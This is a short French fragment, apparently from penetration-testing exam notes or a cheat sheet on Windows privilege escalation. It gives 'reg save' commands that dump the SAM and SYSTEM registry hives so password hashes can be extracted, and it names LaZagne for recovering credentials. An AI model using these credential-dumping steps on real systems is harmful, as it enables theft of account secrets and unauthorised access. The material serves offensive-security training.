...
```powershell
# Dumper SAM et SYSTEM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Sur Kali — extraire les hashes
...
# Redémarrer le service ou attendre la tâche planifiée
```

### LaZagne (récupération de credentials)
...
hostname
ipconfig
whoami  # doit afficher SYSTEM ou Administrator
```

> **Screenshot obligatoire** : proof.txt + hostname + IP dans le même screenshot.
